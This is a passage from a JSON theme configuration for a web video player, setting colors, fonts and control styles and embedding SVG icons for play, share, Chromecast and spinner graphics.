id=\\"channels\\"> <rect x=\\"10.0781\\" y=\\"44.9455\\" width=\\"79.9745\\" height=\\"10.0484\\" style=\\"fill:white;\\"/> <rect x=\\"10.0781\\" y=\\"24.9455\\" width=\\"79.9745\\" height=\\"10.0484\\" style=\\"fill:white;\\"/> <rect x=\\"10.0781\\" y=\\"64.9455\\" width=\\"79.9745\\" height=\\"10.0484\\" style=\\"fill:white;\\"/> </g> </svg> ","AudioList":{"scroll":{"normal":{"color":"COLOR_CONTROLS_1","width":6}},"track":{"normal":{"color":"COLOR_CONTROLS_2","width":6}}},"AdvertisementsLabel":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":16}},"SeriesPopupExpandButton":{"normal":{"icon":"ARROW_DOWN"},"selected":{"icon":"ARROW_UP"}},"SeriesPopupRightButton":{"normal":{"icon":"ARROW_RIGHT"}},"COLOR_PROGRESS_1":"@rgb:#007BFF","MessageUserSingleActionButtonText":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":15}},"SubtitlePopupItemIndicator":{"normal":{"color":"COLOR_CONTROLS_0","borderRadius":6},"selected":{"color":"COLOR_PROGRESS_1"},"over":{"color":"COLOR_BASE_1"}},"ICON_SHARE_LINKEDIN":"<?xml version=\\"1.0\\" standalone=\\"no\\"?><!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"><svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"><g id=\\"Layer2\\"><g><path d=\\"M25.379,15.252c0,5.315 -3.924,9.62 -10.381,9.62c-6.074,0 -9.998,-4.304 -9.998,-9.62c0,-5.443 4.051,-9.621 10.252,-9.621c6.203,0 10.002,4.178 10.127,9.621ZM5.506,94.368l0,-61.9l19.242,0l0,61.901l-19.242,0l0,-0.001Z\\" style=\\"fill:#fff;fill-rule:nonzero;\\"/><path d=\\"M36.262,52.215c0,-7.721 -0.252,-14.176 -0.504,-19.747l16.707,0l0.889,8.608l0.379,0c2.531,-4.053 8.734,-10.002 19.115,-10.002c12.658,-3.55271e-15 22.152,8.482 22.152,26.71l0,36.585l-19.242,0l0,-34.306c0,-7.976 -2.785,-13.417 -9.748,-13.417c-5.316,0 -8.479,3.67 -9.871,7.215c-0.508,1.265 -0.635,3.038 -0.635,4.811l0,35.697l-19.242,0l0,-42.154Z\\" style=\\"fill:#fff;fill-rule:nonzero;\\"/></g></g></svg>","ICON_LIVE_NOTSYNC":"<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\" xmlns=\\"http://www.w3.org/2000/svg\\"> <g id=\\"live\\"> <circle style=\\"fill: white;\\" cx=\\"19.974\\" cy=\\"51.077\\" r=\\"15.804\\" transform=\\"matrix(0.943772, 0, 0, 0.910487, -3.935531, 3.495057)\\"/> <path d=\\"M 40.084 37.291 L 40.084 60.013 L 51.433 60.013 L 51.433 62.926 L 36.541 62.926 L 36.541 37.291 L 40.084 37.291 Z M 55.2 44.806 L 58.47 44.806 L 58.47 62.926 L 55.2 62.926 L 55.2 44.806 Z M 59.202 39.119 C 59.202 39.426 59.137 39.711 59.005 39.975 C 58.875 40.247 58.705 40.49 58.496 40.704 C 58.277 40.909 58.028 41.071 57.75 41.189 C 57.472 41.308 57.171 41.368 56.849 41.368 C 56.534 41.368 56.243 41.308 55.973 41.189 C 55.694 41.071 55.449 40.909 55.24 40.704 C 55.022 40.49 54.852 40.247 54.731 39.975 C 54.609 39.711 54.548 39.426 54.548 39.119 C 54.548 38.804 54.609 38.506 54.731 38.225 C 54.852 37.944 55.022 37.701 55.24 37.496 C 55.449 37.282 55.694 37.116 55.973 36.998 C 56.243 36.88 56.534 36.819 56.849 36.819 C 57.171 36.819 57.472 36.88 57.75 36.998 C 58.028 37.116 58.277 37.282 58.496 37.496 C 58.705 37.701 58.875 37.944 59.005 38.225 C 59.137 38.506 59.202 38.804 59.202 39.119 Z M 69.424 62.926 L 61.866 44.806 L 64.547 44.806 C 64.8 44.806 65.012 44.87 65.187 44.997 C 65.352 45.134 65.475 45.291 65.553 45.471 L 70.248 57.124 C 70.421 57.559 70.555 57.99 70.653 58.416 C 70.748 58.849 70.839 59.275 70.927 59.693 C 71.023 59.275 71.127 58.849 71.241 58.416 C 71.354 57.99 71.493 57.559 71.659 57.124 L 76.418 45.471 C 76.497 45.275 76.614 45.113 76.771 44.985 C 76.936 44.866 77.141 44.806 77.386 44.806 L 79.935 44.806 L 72.378 62.926 L 69.424 62.926 Z M 89.823 44.512 C 90.929 44.512 91.954 44.695 92.895 45.061 C 93.837 45.428 94.647 45.952 95.326 46.633 C 96.014 47.323 96.551 48.17 96.935 49.176 C 97.319 50.182 97.51 51.332 97.51 52.626 C 97.51 53.121 97.452 53.453 97.341 53.624 C 97.236 53.793 97.031 53.879 96.726 53.879 L 84.383 53.879 C 84.41 55.02 84.566 56.013 84.854 56.856 C 85.15 57.709 85.555 58.416 86.07 58.977 C 86.584 59.548 87.195 59.975 87.9 60.255 C 88.607 60.536 89.399 60.677 90.28 60.677 C 91.099 60.677 91.805 60.583 92.399 60.396 C 92.981 60.208 93.487 60.009 93.915 59.795 C 94.341 59.582 94.7 59.382 94.987 59.195 C 95.275 59.007 95.524 58.913 95.733 58.913 C 96.001 58.913 96.21 59.016 96.36 59.22 L 97.275 60.383 C 96.864 60.86 96.381 61.274 95.824 61.623 C 95.265 61.98 94.664 62.271 94.02 62.492 C 93.382 62.721 92.72 62.892 92.032 63.003 C 91.353 63.122 90.676 63.181 90.006 63.181 C 88.724 63.181 87.542 62.968 86.462 62.543 C 85.381 62.117 84.449 61.495 83.665 60.677 C 82.871 59.859 82.256 58.849 81.82 57.648 C 81.384 56.447 81.168 55.064 81.168 53.495 C 81.168 52.234 81.364 51.054 81.756 49.956 C 82.156 48.857 82.727 47.907 83.469 47.105 C 84.208 46.297 85.119 45.662 86.2 45.202 C 87.273 44.742 88.48 44.512 89.823 44.512 Z M 89.888 46.863 C 88.319 46.863 87.081 47.307 86.175 48.192 C 85.276 49.078 84.714 50.31 84.489 51.885 L 94.582 51.885 C 94.582 51.145 94.478 50.466 94.268 49.853 C 94.059 49.24 93.753 48.713 93.353 48.269 C 92.952 47.818 92.458 47.468 91.875 47.221 C 91.3 46.982 90.637 46.863 89.888 46.863 Z\\" style=\\"fill: white;\\"/> </g> </svg>","EndSplashCountdownImageSpinner":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"rotationSpeed":45,"rotationTimeInterval":64,"icon":"ICON_SPINNER","iconColor":"COLOR_CONTROLS_1"}},"ChannelsPopupTitle":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":16}},"ShareButtonMail":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"iconPadding":4,"icon":"ICON_SHARE_MAIL"}},"SubtitleButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_1","alpha":0.88,"icon":"ICON_SUBTITLES"},"over":{"color":"COLOR_CONTROLS_2","alpha":0.95}},"VolumeIndicator":{"normal":{"color":"COLOR_BASE_1","borderRadius":7}},"COLOR_SHADOW":"@rgb:#000000","COLOR_PROGRESS_0":"@rgb:#AAAAAA","ICON_CHROMECAST":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100px\\" height=\\"100px\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" xmlns:serif=\\"http://www.serif.com/\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"cast\\" transform=\\"matrix(4.24798,0,0,4.24798,-0.975773,-0.975773)\\"> <path d=\\"M1,18L1,21L4,21C4,19.34 2.66,18 1,18ZM1,14L1,16C3.76,16 6,18.24 6,21L8,21C8,17.13 4.87,14 1,14ZM1,10L1,12C5.97,12 10,16.03 10,21L12,21C12,14.92 7.07,10 1,10ZM21,3L3,3C1.9,3 1,3.9 1,5L1,8L3,8L3,5L21,5L21,19L14,19L14,21L21,21C22.1,21 23,20.1 23,19L23,5C23,3.9 22.1,3 21,3Z\\" style=\\"fill:white;\\"/> </g> </svg> ","MessageTextDetails":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":10}},"ICON_PLAY":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"play\\" transform=\\"matrix(1, 0, 0, 1, 10.350433, 0)\\"> <path d=\\"M85.2184,46.152L21.0081,6.3721C16.3296,3.30161 12.5001,5.5606 12.5001,11.3911L12.5001,88.6108C12.5001,94.4383 16.3296,96.6973 21.0081,93.6298L85.2184,53.8499C85.2184,53.8499 87.4999,52.2449 87.4999,50.001C87.4999,47.757 85.2184,46.152 85.2184,46.152Z\\" style=\\"fill:#FFF;fill-rule:nonzero;\\"/> </g> </svg> ","ChannelsPopupItemLogoSpinner":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"rotationSpeed":45,"rotationTimeInterval":64,"icon":"ICON_SPINNER","iconColor":"COLOR_CONTROLS_1"}},"SeriesPopupItemRenderer":{"normal":{"color":"COLOR_CONTROLS_1"},"selected":{"color":"COLOR_CONTROLS_0"},"over":{"color":"COLOR_BASE_0"}},"EndSplashCountdownTitle":{"normal":{"fontResponsive":{"min":8,"max":30,"ratio":7},"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0"}},"ICON_MAXIMIZE":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"maximize\\"> <path d=\\"M59.199,5L72.9153,16.1022L55.6344,32.8138L67.0447,44.2241L83.7734,26.9249L95.1415,40.9425L95.1415,5L59.199,5L59.199,5ZM32.8138,55.6344L16.0942,72.9245L4.85851,59.0575L4.85851,95L40.801,95L26.934,83.7643L44.2241,67.0447L32.8138,55.6344Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> </g> </svg> ","SeriesPopupSeparator":{"normal":{"color":"COLOR_BASE_0"}},"FullscreenButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_0","alpha":0.95,"icon":"ICON_MAXIMIZE"},"normal.fullscreen":{"iconPadding":10,"icon":"ICON_MINIMIZE"},"normal.embed":{"iconPadding":10,"icon":"ICON_MAXIMIZE"}},"PlayPauseReloadButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_0","alpha":0.95,"icon":"ICON_PLAY"},"normal.reload":{"icon":"ICON_RELOAD"},"normal.pause":{"icon":"ICON_PAUSE"},"normal.play":{"icon":"ICON_PLAY"}},"EndSplashCountdownButtonLabel":{"normal":{"fontResponsive":{"min":8,"max":32,"ratio":4},"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0"}},"TitleLabel":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"fontResponsive":{"min":10,"max":64,"ratio":16},"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0"}},"EndSplashCountdownSpinner":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"rotationSpeed":45,"rotationTimeInterval":64,"icon":"ICON_SPINNER","iconColor":"COLOR_CONTROLS_1"}},"ICON_AD_PLAY":"<svg xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xmlns=\\"http://www.w3.org/2000/svg\\" version=\\"1.1\\" x=\\"0px\\" y=\\"0px\\" viewBox=\\"0 0 100 100\\" xml:space=\\"preserve\\"> <g> <rect fill=\\"rgba(68,68,68,0.75)\\" x=\\"0\\" y=\\"0\\" rx=\\"6\\" ry=\\"6\\" width=\\"100px\\" height=\\"100px\\"/> <path fill=\\"rgba(255,255,255,0.7)\\" d=\\"M40,35 L40,65 L65,50 L40,35 Z\\"/> </g> </svg> ","COLOR_CONTROLS_1":"@rgb:#4A4A4A","COLOR_BASE_1":"@rgb:#FFFFFF","SeriesPopupTitle":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":16}},"SeriesPopup":{"normal":{"color":"COLOR_CONTROLS_0","borderRadius":4}},"AdvertisementsMuteButton":{"normal":{"iconPadding":8,"color":"#444444","alpha":0.75,"icon":"ICON_AD_MUTE","borderRadius":6},"normal.unmute":{"iconPadding":8,"color":"#444444","alpha":0.75,"icon":"ICON_AD_MUTE","borderRadius":6},"normal.mute":{"iconPadding":8,"color":"#444444","alpha":0.75,"icon":"ICON_AD_UNMUTE","borderRadius":6}},"AdvertisementsCounter":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":16}},"MessageText":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":14}},"StartSplashDefaultPlayButton":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"icon":"ICON_PLAY"}},"ChannelsButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_1","alpha":0.88,"icon":"ICON_PLAYLIST"},"over":{"color":"COLOR_CONTROLS_2","alpha":0.95}},"SERIES_PLAY":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"Layer1\\"> <g> <circle cx=\\"50\\" cy=\\"50\\" r=\\"44.0322\\" style=\\"fill:#000000;fill-opacity:0.596078;\\"/> <path d=\\"M50,1.26572C76.9152,1.26572 98.7343,23.0848 98.7343,50C98.7343,76.9152 76.9152,98.7343 50,98.7343C23.0848,98.7343 1.26572,76.9152 1.26572,50C1.26572,23.0848 23.0848,1.26572 50,1.26572ZM50,5.96776C74.3183,5.96776 94.0322,25.6817 94.0322,50C94.0322,74.3183 74.3183,94.0322 50,94.0322C25.6817,94.0322 5.96776,74.3183 5.96776,50C5.96776,25.6817 25.6817,5.96776 50,5.96776Z\\" style=\\"fill:rgb(209,209,211);\\"/> <path d=\\"M64.8377,51.0148L40.247,64.8277L40.247,37.2019L64.8377,51.0148Z\\" style=\\"fill:rgb(211,211,213);\\"/> </g> </g> </svg> ","VolumeProgress":{"normal":{"color":"COLOR_PROGRESS_1"}},"EndSplashCountdownButton":{"normal":{"color":"COLOR_CONTROLS_1","borderRadius":4}},"SubtitlePopupContainer":{"normal":{"color":"COLOR_CONTROLS_0","alpha":0.95}},"TitleSublabel":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"fontResponsive":{"min":8,"max":30,"ratio":48},"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0"}},"ChromecastButton":{"normal":{"iconPadding":10,"color":"COLOR_CONTROLS_1","alpha":0.88,"icon":"ICON_CHROMECAST"},"over":{"color":"COLOR_CONTROLS_2","alpha":0.95}},"ChannelsPopupItemLogoHolder":{"normal":{"color":"COLOR_BASE_0"}},"ChannelsPopupItemLogoContainer":{"normal":{"color":"COLOR_BASE_0"}},"EndSplashDefaultReloadButton":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"icon":"ICON_RELOAD"}},"ICON_PROGRESSBG_TIP":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g transform=\\"matrix(1,0,0,1,50,50)\\"> <g id=\\"tip\\" transform=\\"matrix(1,0,0,1,-50,-50)\\"> <g id=\\"tip1\\" transform=\\"matrix(10,0,0,10,-70,-50)\\"> <path d=\\"M7,10L12,15L17,10L7,10Z\\" style=\\"fill-rule:nonzero;\\"/> </g> </g> </g> </svg> ","COLOR_BASE_0":"@rgb:#000000","ChannelsPopup":{"normal":{"color":"COLOR_BACKGROUND","borderRadius":4}},"ICON_AUDIO":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"audio\\"> <path d=\\"M34.5041,15.815L34.5069,71.6147C31.4684,70.9817 27.9333,71.2197 24.4274,72.5203C16.54,75.4507 13.7572,82.5792 15.8488,88.4381C17.9403,94.3017 24.1095,96.6744 31.9969,93.7449C38.6956,91.2565 43.079,85.7418 42.9708,80.546C42.9708,80.546 42.9708,50.9552 42.9708,34.4525L76.3562,26.8011L76.3562,62.2113C73.3177,61.5784 69.7826,61.8163 66.2767,63.1169C58.3893,66.0463 55.6065,73.1758 57.698,79.0347C59.7896,84.8983 65.9588,87.271 73.8462,84.3415C80.5449,81.8532 84.9283,76.3385 84.8201,71.1426L84.8201,5L34.5041,15.815Z\\" style=\\"fill:white;fill-rule:nonzero;\\"/> </g> </svg> ","MessageClose":{"normal":{"iconPadding":2,"icon":"ICON_CLOSE"}},"ProgressPopupBackgroundTip":{"normal":{"icon":"ICON_PROGRESSBG_TIP","iconColor":"COLOR_CONTROLS_0"}},"COLOR_BACKDROP":"@rgb:#000000","EndSplashTilesItemRenderer":{"normal":{"color":"COLOR_BACKGROUND","borderRadius":4},"over":{"color":"COLOR_CONTROLS_1"}},"ProgressPopupExtraLabel":{"normal":{"fontColor":"COLOR_TEXT","fontFamily":"Font_0f73f475b6be13bab873ca6ce0","fontSize":12}},"EndSplashTilesItemImagePlaceholder":{"normal":{"icon":"ICON_PLAY","iconColor":"COLOR_BASE_1"}},"MessageUserSingleActionButton":{"normal":{"borderWidth":1,"borderColor":"#909090","borderRadius":8}},"MessageTitleBar":{"normal":{"color":"COLOR_TEXT","alpha":0.25}},"ICON_SHARE_TWITTER":"<?xml version=\\"1.0\\" standalone=\\"no\\"?><!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"><svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"><g id=\\"Layer2\\"><path d=\\"M95,22.0968c-3.3125,1.46785 -6.86684,2.46329 -10.6011,2.90758c3.81304,-2.28332 6.73186,-5.90514 8.11535,-10.2075c-3.57683,2.1146 -7.52484,3.64994 -11.7316,4.48228c-3.36874,-3.5937 -8.16034,-5.83203 -13.475,-5.83203c-10.1962,0 -18.4634,8.2672 -18.4634,18.4578c0,1.44535 0.163094,2.85696 0.478035,4.20671c-15.3421,-0.770481 -28.9464,-8.12098 -38.0516,-19.2901c-1.59158,2.72199 -2.49703,5.89389 -2.49703,9.27951c0,6.40567 3.26189,12.0577 8.21096,15.3646c-3.02568,-0.101231 -5.8714,-0.933575 -8.36281,-2.31707l0,0.230582c0,8.94207 6.36631,16.405 14.8078,18.1035c-1.54659,0.416172 -3.17753,0.646754 -4.86471,0.646754c-1.19228,0 -2.34519,-0.118103 -3.4756,-0.343061c2.35081,7.33925 9.16703,12.6764 17.243,12.8226c-6.31569,4.94907 -14.2792,7.8904 -22.9288,7.8904c-1.49035,0 -2.9582,-0.0899831 -4.40355,-0.253078c8.17159,5.24714 17.8729,8.30657 28.2997,8.30657c33.963,0 52.5277,-28.131 52.5277,-52.5277l-0.0618634,-2.39018c3.62744,-2.58701 6.76561,-5.83766 9.23452,-9.53821Z\\" style=\\"fill:#fff;fill-rule:nonzero;\\"/></g></svg>","ShareButtonFacebook":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"iconPadding":4,"icon":"ICON_SHARE_FACEBOOK"}},"ChannelsPopupItemProgress":{"normal":{"color":"#2ab1d4","borderRadius":2}},"ClickableLayer":{"normal":{"color":"COLOR_BACKDROP","alpha":0},"backdrop":{"color":"COLOR_BACKDROP","alpha":0.5}},"EndSplashSocialTwitter":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"iconPadding":4,"icon":"ICON_SHARE_TWITTER"}},"SeriesList":{"scroll":{"normal":{"color":"COLOR_CONTROLS_1","alpha":0.75,"width":6}},"track":{"normal":{"color":"COLOR_BASE_0","width":6}}},"ShareButtonEmbed":{"normal":{"shadow":{"color":"COLOR_SHADOW","alpha":1,"distance":0,"angle":0,"blur":4},"iconPadding":4,"icon":"ICON_SHARE_EMBED"}},"COLOR_TEXT":"@rgb:#FFFFFF","ControlbarContainer":{"normal":{"color":"COLOR_CONTROLS_1","alpha":0.88}},"AdvertisementsCloseButton":{"normal":{"icon":"ICON_CLOSE"}},"AdvertisementsBar":{"normal":{"color":"#444444","alpha":0.75,"borderRadius":6}},"ICON_SPINNER":"<?xml version=\\"1.0\\" standalone=\\"no\\"?> <!DOCTYPE svg PUBLIC \\"-//W3C//DTD SVG 1.1//EN\\" \\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\\"> <svg width=\\"100%\\" height=\\"100%\\" viewBox=\\"0 0 100 100\\" version=\\"1.1\\" xmlns=\\"http://www.w3.org/2000/svg\\" xmlns:xlink=\\"http://www.w3.org/1999/xlink\\" xml:space=\\"preserve\\" style=\\"fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;\\"> <g id=\\"spinner 2\\"> <path id=\\"100\\" d=\\"M56.8906,24.2656L56.8906,11.9375C56.8906,10.0312 56.2187,8.39844 54.875,7.03906C53.5312,5.67969 51.9062,5 50,5C48.0625,5 46.4141,5.67969 45.0547,7.03906C43.6953,8.39844 43.0156,10.0312 43.0156,11.9375L43.0156,24.2656C43.0156,26.1719 43.6953,27.8047 45.0547,29.1641C46.4141,30.5234 48.0625,31.2187 50,31.25C51.9062,31.25 53.5312,30.5625 54.875,29.1875C56.2187,27.8125 56.8906,26.1719 56.8906,24.2656L56.8906,24.2656Z\\" style=\\"fill-opacity:0.901961;fill-rule:nonzero;\\"/> <path id=\\"87.5\\" d=\\"M38.6562,31.8125C38.6562,29.9062 37.9844,28.2656 36.6406,26.8906L27.9219,18.1719C26.5781,16.8281 24.9531,16.1562 23.0469,16.1562C21.1406,16.1562 19.5156,16.8281 18.1719,18.1719C16.8281,19.5469 16.1562,21.1875 16.1562,23.0937C16.1562,25 16.8281,26.625 18.1719,27.9687L26.8906,36.6875C28.2344,38.0312 29.8594,38.7031 31.7656,38.7031C33.6719,38.7031 35.2969,38.0312 36.6406,36.6875C37.9844,35.3437 38.6562,33.7187 38.6562,31.8125L38.6562,31.8125Z\\" style=\\"fill-opacity:0.780392;fill-rule:nonzero;\\"/> <path id=\\"75\\" d=\\"M31.2031,50C31.2031,48.0937 30.5156,46.4609 29.1406,45.1016C27.7656,43.7422 26.125,43.0625 24.2187,43.0625L11.8906,43.0625C9.98438,43.0625 8.35938,43.7422 7.01562,45.1016C5.67188,46.4609 5,48.0937 5,50C5,51.9062 5.67187,53.5391 7.01562,54.8984C8.35938,56.2578 9.98438,56.9375 11.8906,56.9375L24.2188,56.9375C26.1562,56.9375 27.8047,56.2578 29.1641,54.8984C30.5234,53.5391 31.2031,51.9062 31.2031,50L31.2031,50Z\\" style=\\"fill-opacity:0.65098;fill-rule:nonzero;\\"/> <path id=\\"62.5\\" d=\\"M38.6562,68.1875C38.6562,66.2812 37.9844,64.6406 36.6406,63.2656C35.2969,61.9219 33.6719,61.25 31.7656,61.25C29.8594,61.25 28.2344,61.9219 26.8906,63.2656L18.125,71.9844C16.7812,73.3281 16.1094,74.9609 16.1094,76.8828C16.1094,78.8047 16.7812,80.4375 18.125,81.7812C19.5,83.125 21.1406,83.7969 23.0469,83.7969C24.9531,83.7969 26.5781,83.125 27.9219,81.7812L36.6406,73.0625C37.9844,71.7187 38.6562,70.0937 38.6562,68.1875L38.6562,68.1875Z\\" style=\\"fill-opacity:0.521569;fill-rule:nonzero;\\"/> <path id=\\"50\\" d=\\"M56.8906,88.0625L56.8906,75.6875C56.8906,73.7812 56.2109,72.1562 54.8516,70.8125C53.4922,69.4688 51.8594,68.7969 49.9531,68.7969C48.0469,68.7969 46.4141,69.4687 45.0547,70.8125C43.6953,72.1562 43.0156,73.7812 43.0156,75.6875L43.0156,88.0625C43.0156,89.9687 43.6953,91.6016 45.0547,92.9609C46.4141,94.3203 48.0469,95 49.9531,95C51.8594,95 53.4922,94.3203 54.8516,92.9609C56.2109,91.6016 56.8906,89.9687 56.8906,88.0625L56.8906,88.0625Z\\" style=\\"fill-opacity:0.4;fill-rule:nonzero;\\"/> <path id=\\"47.5\\" d=\\"M83.8438,76.9062C83.8438,75 83.1562,73.375 81.7812,72.0312L73.0156,63.3125C71.6719,61.9687 70.0469,61.2891 68.1406,61.2734C66.2344,61.2578 64.6094,61.9219 63.2656,63.2656C61.9219,64.6406 61.25,66.2812 61.25,68.1875C61.25,70.0938 61.9219,71.7188 63.2656,73.0625L72.0312,81.7812C73.375,83.125 75,83.7969 76.9062,83.7969C78.8125,83.7969 80.4375,83.125 81.7812,81.7812C83.1562,80.4375 83.8438,78.8125 83.8438,76.9062L83.8438,76.9062Z\\" style=\\"fill-opacity:0.368627;fill-rule:nonzero;\\"/> <path id=\\"35\\" d=\\"M95,50C94.9688,48.0937 94.2734,46.4609 92.9141,45.1016C91.5547,43.7422 89.9219,43.0625 88.0156,43.0625L75.7344,43.0625C73.8281,43.0625 72.1875,43.7422 70.8125,45.1016C69.4375,46.4609 68.75,48.0937 68.75,50C68.75,51.9062 69.4375,53.5391 70.8125,54.8984C72.1875,56.2578 73.8281,56.9375 75.7344,56.9375L88.0156,56.9375C89.9531,56.9375 91.6016,56.2578 92.9609,54.8984C94.3203,53.5391 95,51.9062 95,50L95,50Z\\" style=\\"fill-opacity:0.25098;fill-rule:nonzero;\\"/> <path id=\\"22.5\\" d=\\"M83.8438,23.0937C83.8438,21.1875 83.1719,19.5469 81.8281,18.1719C80.4844,16.8281 78.8516,16.1562 76.9297,16.1562C75.0078,16.1562 73.375,16.8281 72.0312,18.1719L63.2656,26.8906C61.9219,28.2656 61.25,29.9062 61.25,31.8125C61.25,33.7187 61.9219,35.3437 63.2656,36.6875C64.6094,38.0312 66.2344,38.7031 